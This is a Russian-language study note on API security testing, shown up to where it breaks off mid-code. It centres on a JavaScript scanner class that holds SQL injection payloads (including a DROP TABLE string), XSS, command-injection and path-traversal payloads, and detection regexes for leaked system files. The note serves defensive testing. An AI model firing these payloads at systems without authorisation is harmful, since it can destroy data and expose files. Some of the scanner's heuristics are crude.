---
aliases: ["Тестирование безопасности API", "API Security Testing", "Тестирование REST API"]
tags: ["#security", "#api-security", "#testing", "#web-security"]
---

# Тестирование безопасности API

## Введение

Тестирование безопасности API - это критически важный процесс, направленный на выявление уязвимостей и недостатков в архитектуре, реализации и развертывании API-интерфейсов. Современные веб-приложения активно используют API для взаимодействия между компонентами, что делает безопасность API особенно важной для общей безопасности системы.

## Типы API и особенности тестирования

### 1. REST API

REST API использует стандартные HTTP методы и требует особого внимания к аутентификации, авторизации и валидации данных.

```javascript
// REST API Security Testing Framework
class RESTAPISecurityTester {
    constructor(config) {
        this.config = {
            baseUrl: config.baseUrl,
            headers: config.headers || {},
            timeout: config.timeout || 10000,
            maxConcurrent: config.maxConcurrent || 5,
            authentication: config.authentication || null,
            ...config
        };
        
        this.testResults = {
            endpoints: [],
            vulnerabilities: [],
            securityIssues: [],
            compliance: {}
        };
        
        this.authenticatedSession = null;
    }
    
    async testRESTAPI() {
        const endpoints = await this.discoverEndpoints();
        
        for (const endpoint of endpoints) {
            await this.testEndpointSecurity(endpoint);
        }
        
        return this.generateRESTReport();
    }
    
    async discoverEndpoints() {
        const endpoints = [];
        
        // 1. Сканирование по документации OpenAPI/Swagger
        const openApiEndpoints = await this.discoverFromOpenAPI();
        endpoints.push(...openApiEndpoints);
        
        // 2. Сканирование по общим путям
        const commonEndpoints = await this.discoverCommonEndpoints();
        endpoints.push(...commonEndpoints);
        
        // 3. Fuzzing путей
        const fuzzedEndpoints = await this.fuzzPaths();
        endpoints.push(...fuzzedEndpoints);
        
        // 4. Анализ из ссылок на страницах
        const linkedEndpoints = await this.discoverFromLinks();
        endpoints.push(...linkedEndpoints);
        
        // Уникальные и отсортированные пути
        const uniqueEndpoints = [...new Set(endpoints.map(e => e.path))];
        return uniqueEndpoints.map(path => ({ path, methods: ['GET', 'POST', 'PUT', 'DELETE'] })); // Упрощение
    }
    
    async discoverFromOpenAPI() {
        const endpoints = [];
        
        try {
            // Проверка наличия документации OpenAPI
            const docsPaths = [
                '/swagger.json',
                '/swagger.yaml',
                '/api-docs',
                '/openapi.json',
                '/openapi.yaml',
                '/v1/swagger.json',
                '/v2/swagger.json'
            ];
            
            for (const path of docsPaths) {
                try {
                    const response = await this.makeRequest('GET', this.config.baseUrl + path);
                    if (response.status === 200) {
                        const spec = response.body.includes('{') ? 
                                    JSON.parse(response.body) : 
                                    this.parseYAML(response.body);
                        
                        if (spec.paths) {
                            for (const [path, methods] of Object.entries(spec.paths)) {
                                for (const [method] of Object.entries(methods)) {
                                    endpoints.push({
                                        path: path,
                                        method: method.toUpperCase(),
                                        summary: methods[method]?.summary || 'Unknown endpoint',
                                        parameters: methods[method]?.parameters || [],
                                        responses: methods[method]?.responses || {}
                                    });
                                }
                            }
                        }
                        break; // Нашли документацию, выходим
                    }
                } catch (error) {
                    // Продолжаем с другими путями
                }
            }
        } catch (error) {
            console.error('OpenAPI discovery failed:', error);
        }
        
        return endpoints;
    }
    
    async discoverCommonEndpoints() {
        const commonPaths = [
            '/api/users',
            '/api/users/{id}',
            '/api/auth',
            '/api/login',
            '/api/logout',
            '/api/register',
            '/api/profile',
            '/api/settings',
            '/api/admin',
            '/api/admin/users',
            '/api/admin/config',
            '/api/admin/logs',
            '/api/data',
            '/api/data/{id}',
            '/api/upload',
            '/api/download',
            '/api/search',
            '/api/files',
            '/api/files/{id}',
            '/api/health',
            '/api/status',
            '/api/version',
            '/api/config',
            '/api/debug',
            '/api/test',
            '/api/v1/users',
            '/api/v2/users',
            '/api/v1/data',
            '/api/v2/data'
        ];
        
        const endpoints = [];
        
        for (const path of commonPaths) {
            try {
                const response = await this.makeRequest('OPTIONS', this.config.baseUrl + path);
                
                if (response.status === 200 || response.headers['allow']) {
                    const allowedMethods = response.headers['allow']?.split(',').map(m => m.trim()) || ['GET', 'POST'];
                    endpoints.push({
                        path: path,
                        methods: allowedMethods,
                        status: response.status
                    });
                }
            } catch (error) {
                // Путь не существует или не доступен
            }
        }
        
        return endpoints;
    }
    
    async fuzzPaths() {
        const fuzzedPaths = [];
        const fuzzList = [
            'admin', 'backup', 'config', 'debug', 'dev', 'docs', 'test',
            'temp', 'tmp', 'upload', 'downloads', 'includes', 'libraries',
            'assets', 'static', 'public', 'private', 'secret', 'hidden',
            'api', 'rest', 'graphql', 'rpc', 'soap', 'xml'
        ];
        
        for (const fuzz of fuzzList) {
            try {
                const response = await this.makeRequest('GET', `${this.config.baseUrl}/${fuzz}`);
                if (response.status !== 404) {
                    fuzzedPaths.push({
                        path: `/${fuzz}`,
                        status: response.status,
                        size: response.body?.length || 0
                    });
                }
            } catch (error) {
                // Path not found
            }
        }
        
        return fuzzedPaths;
    }
    
    async testEndpointSecurity(endpoint) {
        const securityTests = {
            authentication: await this.testAuthentication(endpoint),
            authorization: await this.testAuthorization(endpoint),
            inputValidation: await this.testInputValidation(endpoint),
            rateLimiting: await this.testRateLimiting(endpoint),
            securityHeaders: await this.testSecurityHeaders(endpoint),
            injection: await this.testInjectionVulnerabilities(endpoint),
            sensitiveData: await this.testSensitiveDataExposure(endpoint),
            cors: await this.testCORSConfiguration(endpoint)
        };
        
        const endpointResult = {
            path: endpoint.path,
            method: endpoint.method,
            securityTests: securityTests,
            overallRisk: this.calculateEndpointRisk(securityTests),
            recommendations: this.generateEndpointRecommendations(securityTests)
        };
        
        this.testResults.endpoints.push(endpointResult);
        
        // Сбор уязвимостей
        for (const [testName, testResult] of Object.entries(securityTests)) {
            if (testResult.vulnerable) {
                this.testResults.vulnerabilities.push({
                    endpoint: endpoint.path,
                    test: testName,
                    vulnerability: testResult,
                    severity: testResult.severity || 'MEDIUM'
                });
            }
        }
        
        return endpointResult;
    }
    
    async testAuthentication(endpoint) {
        const results = {
            authenticated: false,
            authRequired: true,
            authMethod: null,
            vulnerable: false,
            issues: []
        };
        
        // Проверка без аутентификации
        const unauthenticatedResponse = await this.makeRequest(
            endpoint.method || 'GET', 
            this.config.baseUrl + endpoint.path
        );
        
        if (unauthenticatedResponse.status === 401 || unauthenticatedResponse.status === 403) {
            results.authRequired = true;
        } else if (unauthenticatedResponse.status === 200) {
            // Доступ без аутентификации - потенциальная уязвимость
            results.vulnerable = true;
            results.issues.push({
                type: 'Missing Authentication',
                severity: 'HIGH',
                description: 'Endpoint accessible without authentication'
            });
        }
        
        // Проверка методов аутентификации
        const authMethods = await this.testAuthMethods(endpoint);
        results.authMethod = authMethods.primaryMethod;
        
        return results;
    }
    
    async testAuthMethods(endpoint) {
        const methods = {
            bearer: false,
            basic: false,
            apikey: false,
            session: false,
            oauth: false,
            vulnerable: false,
            issues: []
        };
        
        // Проверка Bearer токенов
        const bearerResponse = await this.makeRequest(
            endpoint.method || 'GET',
            this.config.baseUrl + endpoint.path,
            null,
            { 'Authorization': 'Bearer invalid-token' }
        );
        
        if (bearerResponse.status === 401) {
            methods.bearer = true;
        }
        
        // Проверка Basic Auth
        const basicResponse = await this.makeRequest(
            endpoint.method || 'GET',
            this.config.baseUrl + endpoint.path,
            null,
            { 'Authorization': 'Basic ' + Buffer.from('invalid:invalid').toString('base64') }
        );
        
        if (basicResponse.status === 401) {
            methods.basic = true;
        }
        
        // Проверка API Key
        const apiKeyResponse = await this.makeRequest(
            endpoint.method || 'GET',
            this.config.baseUrl + endpoint.path,
            null,
            { 'X-API-Key': 'invalid-key' }
        );
        
        if (apiKeyResponse.status === 401) {
            methods.apikey = true;
        }
        
        // Проверка на уязвимости в аутентификации
        if (!methods.bearer && !methods.basic && !methods.apikey) {
            methods.vulnerable = true;
            methods.issues.push({
                type: 'Weak Authentication',
                severity: 'MEDIUM',
                description: 'No standard authentication method detected'
            });
        }
        
        return methods;
    }
    
    async testAuthorization(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            horizontal: false, // горизонтальное эскалирование
            vertical: false   // вертикальное эскалирование
        };
        
        // Тестирование горизонтального эскалирования
        const horizontalResult = await this.testHorizontalPrivilegeEscalation(endpoint);
        if (horizontalResult.vulnerable) {
            results.vulnerable = true;
            results.horizontal = true;
            results.issues.push(horizontalResult);
        }
        
        // Тестирование вертикального эскалирования
        const verticalResult = await this.testVerticalPrivilegeEscalation(endpoint);
        if (verticalResult.vulnerable) {
            results.vulnerable = true;
            results.vertical = true;
            results.issues.push(verticalResult);
        }
        
        return results;
    }
    
    async testHorizontalPrivilegeEscalation(endpoint) {
        // Проверка на возможность доступа к данным других пользователей
        const testResults = {
            vulnerable: false,
            issues: []
        };
        
        // Проверка параметров ID в URL
        if (endpoint.path.includes('{id}') || endpoint.path.includes(':id')) {
            // Попытка доступа с поддельным ID
            const fakeId = '1234567890abcdef12345678';
            const fakePath = endpoint.path.replace(/{id}|:id/g, fakeId);
            
            const response = await this.makeRequest(
                endpoint.method || 'GET',
                this.config.baseUrl + fakePath,
                null,
                this.getAuthenticatedHeaders()
            );
            
            if (response.status !== 404 && response.status !== 403) {
                testResults.vulnerable = true;
                testResults.issues.push({
                    type: 'Horizontal Privilege Escalation',
                    severity: 'HIGH',
                    description: `Access to another user's data possible via ID parameter`,
                    endpoint: endpoint.path,
                    testedId: fakeId,
                    responseStatus: response.status
                });
            }
        }
        
        return testResults;
    }
    
    async testVerticalPrivilegeEscalation(endpoint) {
        // Проверка на возможность доступа к административным функциям
        const testResults = {
            vulnerable: false,
            issues: []
        };
        
        // Проверка, является ли эндпоинт административным
        const isAdminEndpoint = this.isAdminEndpoint(endpoint.path);
        
        if (isAdminEndpoint) {
            // Проверка с неадминистративным токеном
            const response = await this.makeRequest(
                endpoint.method || 'GET',
                this.config.baseUrl + endpoint.path,
                null,
                this.getNonAdminHeaders()
            );
            
            if (response.status === 200 || response.status === 201) {
                testResults.vulnerable = true;
                testResults.issues.push({
                    type: 'Vertical Privilege Escalation',
                    severity: 'CRITICAL',
                    description: `Non-admin user can access admin endpoint`,
                    endpoint: endpoint.path,
                    responseStatus: response.status
                });
            }
        }
        
        return testResults;
    }
    
    isAdminEndpoint(path) {
        return /admin|manage|system|config|dashboard|user\/.*\/role/.test(path);
    }
    
    async testInputValidation(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            injection: false,
            validation: false
        };
        
        // Тестирование на инъекции
        const injectionTests = await this.testInjectionVulnerabilities(endpoint);
        if (injectionTests.vulnerable) {
            results.vulnerable = true;
            results.injection = true;
            results.issues.push(...injectionTests.issues);
        }
        
        // Тестирование валидации параметров
        const validationTests = await this.testParameterValidation(endpoint);
        if (validationTests.vulnerable) {
            results.vulnerable = true;
            results.validation = true;
            results.issues.push(...validationTests.issues);
        }
        
        return results;
    }
    
    async testInjectionVulnerabilities(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                sql: false,
                xss: false,
                command: false,
                pathTraversal: false
            }
        };
        
        // SQL Injection тесты
        const sqlTests = await this.testSQLInjection(endpoint);
        if (sqlTests.vulnerable) {
            results.vulnerable = true;
            results.types.sql = true;
            results.issues.push(...sqlTests.issues);
        }
        
        // XSS тесты
        const xssTests = await this.testXSS(endpoint);
        if (xssTests.vulnerable) {
            results.vulnerable = true;
            results.types.xss = true;
            results.issues.push(...xssTests.issues);
        }
        
        // Command Injection тесты
        const cmdTests = await this.testCommandInjection(endpoint);
        if (cmdTests.vulnerable) {
            results.vulnerable = true;
            results.types.command = true;
            results.issues.push(...cmdTests.issues);
        }
        
        // Path Traversal тесты
        const pathTests = await this.testPathTraversal(endpoint);
        if (pathTests.vulnerable) {
            results.vulnerable = true;
            results.types.pathTraversal = true;
            results.issues.push(...pathTests.issues);
        }
        
        return results;
    }
    
    async testSQLInjection(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            payloads: []
        };
        
        const sqlPayloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL, NULL, NULL --",
            "'; DROP TABLE users; --",
            "admin'--",
            "' AND 1=1--",
            "1' AND '1'='1'--",
            "' OR 1=1--",
            "'; WAITFOR DELAY '00:00:05'--"
        ];
        
        // Получение параметров из документации или анализа
        const parameters = await this.getEndpointParameters(endpoint);
        
        for (const param of parameters) {
            for (const payload of sqlPayloads) {
                try {
                    const testParams = { ...param, [param.name]: payload };
                    const response = await this.makeRequest(
                        endpoint.method || 'POST',
                        this.config.baseUrl + endpoint.path,
                        testParams,
                        this.getAuthenticatedHeaders()
                    );
                    
                    // Проверка на SQL ошибки
                    const sqlErrorPatterns = [
                        /SQL syntax/,
                        /mysql/i,
                        /postgresql/i,
                        /ora-\d{4}/i,
                        /sqlite/i,
                        /unclosed quotation mark/i,
                        /syntax error/i
                    ];
                    
                    for (const pattern of sqlErrorPatterns) {
                        if (pattern.test(response.body)) {
                            results.vulnerable = true;
                            results.issues.push({
                                type: 'SQL Injection',
                                severity: 'CRITICAL',
                                parameter: param.name,
                                payload: payload,
                                location: 'response_body',
                                evidence: `SQL error pattern found: ${pattern}`,
                                cvssScore: 9.8,
                                cweId: 'CWE-89'
                            });
                            break;
                        }
                    }
                    
                    // Проверка времени ответа (Time-based blind SQLi)
                    if (response.responseTime > 5000) { // >5 секунд
                        results.vulnerable = true;
                        results.issues.push({
                            type: 'Time-based SQL Injection',
                            severity: 'HIGH',
                            parameter: param.name,
                            payload: payload,
                            responseTime: response.responseTime,
                            cvssScore: 7.5,
                            cweId: 'CWE-89'
                        });
                    }
                } catch (error) {
                    // Продолжаем с другими тестами
                }
            }
        }
        
        return results;
    }
    
    async testXSS(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                reflected: false,
                stored: false,
                domBased: false
            }
        };
        
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '"><iframe src="javascript:alert(\'XSS\')">'
        ];
        
        const parameters = await this.getEndpointParameters(endpoint);
        
        for (const param of parameters) {
            for (const payload of xssPayloads) {
                try {
                    const testParams = { ...param, [param.name]: payload };
                    const response = await this.makeRequest(
                        endpoint.method || 'POST',
                        this.config.baseUrl + endpoint.path,
                        testParams,
                        this.getAuthenticatedHeaders()
                    );
                    
                    // Проверка на отражение пейлоада
                    if (response.body && response.body.includes(payload)) {
                        results.vulnerable = true;
                        results.types.reflected = true;
                        
                        // Определение типа XSS
                        let xssType = 'Reflected XSS';
                        if (payload.includes('onerror')) xssType = 'Stored XSS';
                        if (payload.includes('javascript:')) xssType = 'Reflected XSS';
                        
                        results.issues.push({
                            type: xssType,
                            severity: 'HIGH',
                            parameter: param.name,
                            payload: payload,
                            location: 'response_body',
                            cvssScore: 7.5,
                            cweId: 'CWE-79'
                        });
                    }
                } catch (error) {
                    // Продолжаем с другими тестами
                }
            }
        }
        
        return results;
    }
    
    async testCommandInjection(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            payloads: []
        };
        
        const cmdPayloads = [
            '; ls',
            '&& dir',
            '| cat /etc/passwd',
            '`whoami`',
            '$(whoami)',
            '; ping -c 5 127.0.0.1',
            '|| echo vulnerable',
            '&& sleep 5'
        ];
        
        const parameters = await this.getEndpointParameters(endpoint);
        
        for (const param of parameters) {
            for (const payload of cmdPayloads) {
                try {
                    const testParams = { ...param, [param.name]: payload };
                    const startTime = Date.now();
                    const response = await this.makeRequest(
                        endpoint.method || 'POST',
                        this.config.baseUrl + endpoint.path,
                        testParams,
                        this.getAuthenticatedHeaders()
                    );
                    const responseTime = Date.now() - startTime;
                    
                    // Проверка на командную инъекцию через время ответа
                    if (responseTime > 4000) { // >4 секунды
                        results.vulnerable = true;
                        results.issues.push({
                            type: 'Command Injection',
                            severity: 'CRITICAL',
                            parameter: param.name,
                            payload: payload,
                            responseTime: responseTime,
                            cvssScore: 9.8,
                            cweId: 'CWE-78'
                        });
                    }
                    
                    // Проверка на признаки выполнения команд
                    const cmdIndicators = [
                        /uid=/i,
                        /gid=/i,
                        /groups=/i,
                        /root:x:0:0:/i,
                        /bin\/bash/i,
                        /command not found/i
                    ];
                    
                    for (const indicator of cmdIndicators) {
                        if (indicator.test(response.body)) {
                            results.vulnerable = true;
                            results.issues.push({
                                type: 'Command Injection',
                                severity: 'CRITICAL',
                                parameter: param.name,
                                payload: payload,
                                evidence: `Command execution indicator: ${indicator}`,
                                cvssScore: 9.8,
                                cweId: 'CWE-78'
                            });
                            break;
                        }
                    }
                } catch (error) {
                    // Продолжаем с другими тестами
                }
            }
        }
        
        return results;
    }
    
    async testPathTraversal(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            payloads: []
        };
        
        const pathTraversalPayloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '../../../windows/win.ini',
            '../../../../windows/system32/drivers/etc/hosts'
        ];
        
        const parameters = await this.getEndpointParameters(endpoint);
        
        for (const param of parameters) {
            for (const payload of pathTraversalPayloads) {
                try {
                    const testParams = { ...param, [param.name]: payload };
                    const response = await this.makeRequest(
                        endpoint.method || 'POST',
                        this.config.baseUrl + endpoint.path,
                        testParams,
                        this.getAuthenticatedHeaders()
                    );
                    
                    // Проверка на признаки доступа к системным файлам
                    const sensitiveFilePatterns = [
                        /root:x:0:0:/i,
                        /localhost name resolution/i,
                        /\[boot loader\]/i,
                        /systemroot/i,
                        /windows directory/i
                    ];
                    
                    for (const pattern of sensitiveFilePatterns) {
                        if (pattern.test(response.body)) {
                            results.vulnerable = true;
                            results.issues.push({
                                type: 'Path Traversal',
                                severity: 'CRITICAL',
                                parameter: param.name,
                                payload: payload,
                                evidence: `Sensitive file content exposed: ${pattern}`,
                                cvssScore: 9.8,
                                cweId: 'CWE-22'
                            });
                            break;
                        }
                    }
                } catch (error) {
                    // Продолжаем с другими тестами
                }
            }
        }
        
        return results;
    }
    
    async testRateLimiting(endpoint) {
        const results = {
            vulnerable: false,
            rateLimited: false,
            rateLimitConfig: null,
            issues: []
        };
        
        // Отправка нескольких запросов для проверки ограничений
        const requests = [];
        const requestCount = 20;
        
        for (let i = 0; i < requestCount; i++) {
            requests.push(
                this.makeRequest(
                    endpoint.method || 'GET',
                    this.config.baseUrl + endpoint.path,
                    null,
                    this.getAnonymousHeaders()
                )
            );
        }
        
        const responses = await Promise.all(requests);
        
        // Подсчет ответов 429 (Too Many Requests)
        const rateLimitedCount = responses.filter(r => r.status === 429).length;
        
        if (rateLimitedCount === 0) {
            results.vulnerable = true;
            results.issues.push({
                type: 'Missing Rate Limiting',
                severity: 'MEDIUM',
                description: 'No rate limiting detected for endpoint',
                requestCount: requestCount,
                rateLimited: rateLimitedCount,
                cvssScore: 5.3,
                cweId: 'CWE-400'
            });
        } else {
            results.rateLimited = true;
            results.rateLimitConfig = this.analyzeRateLimitConfig(responses);
        }
        
        return results;
    }
    
    analyzeRateLimitConfig(responses) {
        // Анализ заголовков ограничения скорости
        const rateLimitHeaders = responses
            .filter(r => r.status === 429)
            .map(r => r.headers)
            .pop(); // Берем первый 429 ответ
        
        if (rateLimitHeaders) {
            return {
                limit: rateLimitHeaders['x-ratelimit-limit'] || 
                       rateLimitHeaders['ratelimit-limit'],
                remaining: rateLimitHeaders['x-ratelimit-remaining'] || 
                          rateLimitHeaders['ratelimit-remaining'],
                reset: rateLimitHeaders['x-ratelimit-reset'] || 
                       rateLimitHeaders['ratelimit-reset']
            };
        }
        
        return null;
    }
    
    async testSecurityHeaders(endpoint) {
        const results = {
            missingHeaders: [],
            insecureHeaders: [],
            issues: [],
            vulnerable: false
        };
        
        const response = await this.makeRequest(
            'GET',
            this.config.baseUrl + endpoint.path,
            null,
            this.getAnonymousHeaders()
        );
        
        const headers = response.headers;
        
        // Проверка отсутствующих заголовков безопасности
        if (!headers['x-content-type-options']) {
            results.missingHeaders.push({
                header: 'X-Content-Type-Options',
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        if (!headers['x-frame-options'] && !headers['content-security-policy']?.includes('frame-ancestors')) {
            results.missingHeaders.push({
                header: 'X-Frame-Options/CSP frame-ancestors',
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        if (!headers['x-xss-protection']) {
            results.missingHeaders.push({
                header: 'X-XSS-Protection',
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        if (this.config.baseUrl.startsWith('https://') && !headers['strict-transport-security']) {
            results.missingHeaders.push({
                header: 'Strict-Transport-Security',
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        if (!headers['content-security-policy']) {
            results.missingHeaders.push({
                header: 'Content-Security-Policy',
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        // Проверка небезопасных значений заголовков
        if (headers['x-frame-options'] && !['DENY', 'SAMEORIGIN'].includes(headers['x-frame-options'].toUpperCase())) {
            results.insecureHeaders.push({
                header: 'X-Frame-Options',
                value: headers['x-frame-options'],
                severity: 'MEDIUM',
                cvssScore: 5.3,
                cweId: 'CWE-693'
            });
        }
        
        if (headers['x-xss-protection'] === '0') {
            results.insecureHeaders.push({
                header: 'X-XSS-Protection',
                value: '0',
                severity: 'HIGH',
                cvssScore: 7.5,
                cweId: 'CWE-693'
            });
        }
        
        results.vulnerable = results.missingHeaders.length > 0 || results.insecureHeaders.length > 0;
        
        return results;
    }
    
    async testSensitiveDataExposure(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            dataTypes: {
                credentials: false,
                personalInfo: false,
                internalInfo: false
            }
        };
        
        const response = await this.makeRequest(
            'GET',
            this.config.baseUrl + endpoint.path,
            null,
            this.getAuthenticatedHeaders()
        );
        
        const body = response.body || '';
        
        // Проверка на утечку чувствительных данных
        const sensitivePatterns = [
            {
                type: 'Credentials',
                pattern: /password|token|secret|key|auth|bearer|api.*key/i,
                severity: 'CRITICAL',
                cweId: 'CWE-798'
            },
            {
                type: 'Personal Information',
                pattern: /email|phone|ssn|credit.*card|social.*security/i,
                severity: 'HIGH',
                cweId: 'CWE-359'
            },
            {
                type: 'Internal Information',
                pattern: /internal|debug|stack.*trace|version|build|config/i,
                severity: 'MEDIUM',
                cweId: 'CWE-200'
            }
        ];
        
        for (const patternInfo of sensitivePatterns) {
            if (patternInfo.pattern.test(body)) {
                results.vulnerable = true;
                results.dataTypes[patternInfo.type.toLowerCase().replace(/\s+/g, '')] = true;
                
                results.issues.push({
                    type: `Sensitive Data Exposure - ${patternInfo.type}`,
                    severity: patternInfo.severity,
                    pattern: patternInfo.pattern.toString(),
                    location: 'response_body',
                    cvssScore: patternInfo.severity === 'CRITICAL' ? 9.8 : 
                              patternInfo.severity === 'HIGH' ? 7.5 : 5.3,
                    cweId: patternInfo.cweId
                });
            }
        }
        
        return results;
    }
    
    async testCORSConfiguration(endpoint) {
        const results = {
            vulnerable: false,
            issues: [],
            corsConfig: null
        };
        
        // Проверка CORS заголовков
        const response = await this.makeRequest(
            'GET',
            this.config.baseUrl + endpoint.path,
            null,
            { 'Origin': 'https://evil-site.com' }
        );
        
        const headers = response.headers;
        
        // Проверка на уязвимость CORS
        if (headers['access-control-allow-origin'] === '*' && 
            headers['access-control-allow-credentials'] === 'true') {
            results.vulnerable = true;
            results.issues.push({
                type: 'CORS Misconfiguration',
                severity: 'HIGH',
                description: 'Wildcard origin with credentials enabled',
                header: 'Access-Control-Allow-Origin: *',
                cvssScore: 7.5,
                cweId: 'CWE-346'
            });
        }
        
        // Проверка на отражение Origin
        if (headers['access-control-allow-origin'] === 'https://evil-site.com') {
            results.vulnerable = true;
            results.issues.push({
                type: 'CORS Origin Reflection',
                severity: 'HIGH',
                description: 'Origin header reflected in response',
                header: 'Access-Control-Allow-Origin',
                cvssScore: 7.5,
                cweId: 'CWE-346'
            });
        }
        
        results.corsConfig = {
            allowOrigin: headers['access-control-allow-origin'],
            allowCredentials: headers['access-control-allow-credentials'],
            allowMethods: headers['access-control-allow-methods'],
            allowHeaders: headers['access-control-allow-headers']
        };
        
        return results;
    }
    
    async getEndpointParameters(endpoint) {
        // Получение параметров эндпоинта из документации или анализа
        try {
            // Попытка получить из OpenAPI документации
            const openApiSpec = await this.getOpenAPISpec();
            if (openApiSpec && openApiSpec.paths && openApiSpec.paths[endpoint.path]) {
                const pathSpec = openApiSpec.paths[endpoint.path];
                const methodSpec = pathSpec[endpoint.method.toLowerCase()];
                
                if (methodSpec && methodSpec.parameters) {
                    return methodSpec.parameters.map(param => ({
                        name: param.name,
                        type: param.type || 'string',
                        in: param.in,
                        required: param.required || false
                    }));
                }
            }
        } catch (error) {
            // Продолжаем без документации
        }
        
        // Возвращаем общий список параметров для тестирования
        return [
            { name: 'id', type: 'string', in: 'path' },
            { name: 'user_id', type: 'string', in: 'query' },
            { name: 'email', type: 'string', in: 'query' },
            { name: 'username', type: 'string', in: 'query' },
            { name: 'password', type: 'string', in: 'query' },
            { name: 'data', type: 'string', in: 'body' },
            { name: 'query', type: 'string', in: 'query' },
            { name: 'search', type: 'string', in: 'query' }
        ];
    }
    
    async getOpenAPISpec() {
        // Загрузка OpenAPI спецификации
        if (!this.openApiSpec) {
            const specPaths = [
                '/swagger.json',
                '/swagger.yaml',
                '/api-docs',
                '/openapi.json'
            ];
            
            for (const path of specPaths) {
                try {
                    const response = await this.makeRequest('GET', this.config.baseUrl + path);
                    if (response.status === 200) {
                        this.openApiSpec = response.body.includes('{') ? 
                                         JSON.parse(response.body) : 
                                         this.parseYAML(response.body);
                        break;
                    }
                } catch (error) {
                    // Продолжаем с другими путями
                }
            }
        }
        
        return this.openApiSpec;
    }
    
    calculateEndpointRisk(tests) {
        let riskScore = 0;
        
        for (const [testName, testResult] of Object.entries(tests)) {
            if (testResult.vulnerable) {
                if (testName === 'injection') {
                    riskScore += 25; // Высокий риск для инъекций
                } else if (testName === 'authentication') {
                    riskScore += 20; // Высокий риск для аутентификации
                } else if (testName === 'authorization') {
                    riskScore += 25; // Высокий риск для авторизации
                } else if (testName === 'sensitiveData') {
                    riskScore += 15; // Средний риск для утечки данных
                } else {
                    riskScore += 10; // Базовый риск
                }
            }
        }
        
        return Math.min(100, riskScore);
    }
    
    generateEndpointRecommendations(tests) {
        const recommendations = [];
        
        if (tests.authentication.vulnerable) {
            recommendations.push({
                category: 'Authentication',
                priority: 'HIGH',
                recommendation: 'Implement proper authentication for endpoint',
                details: tests.authentication.issues
            });
        }
        
        if (tests.authorization.vulnerable) {
            recommendations.push({
                category: 'Authorization',
                priority: 'HIGH',
                recommendation: 'Implement proper authorization checks',
                details: tests.authorization.issues
            });
        }
        
        if (tests.inputValidation.vulnerable) {
            recommendations.push({
                category: 'Input Validation',
                priority: 'HIGH',
                recommendation: 'Implement comprehensive input validation and sanitization',
                details: tests.inputValidation.issues
            });
        }
        
        if (tests.rateLimiting.vulnerable) {
            recommendations.push({
                category: 'Rate Limiting',
                priority: 'MEDIUM',
                recommendation: 'Implement rate limiting for endpoint',
                details: tests.rateLimiting.issues
            });
        }
        
        if (tests.securityHeaders.vulnerable) {
            recommendations.push({
                category: 'Security Headers',
                priority: 'MEDIUM',
                recommendation: 'Add security headers to API responses',
                details: tests.securityHeaders.issues
            });
        }
        
        return recommendations;
    }
    
    generateRESTReport() {
        const summary = {
            totalEndpoints: this.testResults.endpoints.length,
            vulnerableEndpoints: this.testResults.endpoints.filter(e => e.overallRisk > 0).length,
            totalVulnerabilities: this.testResults.vulnerabilities.length,
            bySeverity: this.countVulnerabilitiesBySeverity(),
            riskAssessment: this.assessOverallRisk(),
            recommendations: this.generateOverallRecommendations()
        };
        
        return {
            methodology: 'REST API Security Testing',
            target: this.config.baseUrl,
            summary: summary,
            detailedResults: this.testResults,
            timestamp: new Date().toISOString()
        };
    }
    
    countVulnerabilitiesBySeverity() {
        const counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
        
        for (const vuln of this.testResults.vulnerabilities) {
            counts[vuln.severity] = (counts[vuln.severity] || 0) + 1;
        }
        
        return counts;
    }
    
    assessOverallRisk() {
        const totalRisk = this.testResults.endpoints.reduce((sum, endpoint) => sum + endpoint.overallRisk, 0);
        const avgRisk = totalRisk / this.testResults.endpoints.length;
        
        if (avgRisk >= 50) return 'CRITICAL';
        if (avgRisk >= 30) return 'HIGH';
        if (avgRisk >= 15) return 'MEDIUM';
        if (avgRisk > 0) return 'LOW';
        return 'SECURE';
    }
    
    generateOverallRecommendations() {
        const recommendations = [];
        
        // Рекомендации на основе всех найденных проблем
        const allIssues = this.testResults.vulnerabilities.map(v => v.vulnerability);
        
        if (this.countByType(allIssues, 'Missing Authentication') > 0) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Implement Authentication for All Sensitive Endpoints',
                description: 'Multiple endpoints accessible without proper authentication',
                actions: [
                    'Require authentication for all sensitive endpoints',
                    'Implement proper authentication tokens',
                    'Use OAuth 2.0 or JWT for secure authentication'
                ]
            });
        }
        
        if (this.countByType(allIssues, 'SQL Injection') > 0) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Fix SQL Injection Vulnerabilities',
                description: 'SQL injection vulnerabilities detected',
                actions: [
                    'Use parameterized queries',
                    'Implement input validation',
                    'Apply principle of least privilege to database access'
                ]
            });
        }
        
        if (this.countByType(allIssues, 'XSS') > 0) {
            recommendations.push({
                priority: 'HIGH',
                title: 'Fix Cross-Site Scripting (XSS) Vulnerabilities',
                description: 'XSS vulnerabilities detected',
                actions: [
                    'Implement proper output encoding',
                    'Use Content Security Policy (CSP)',
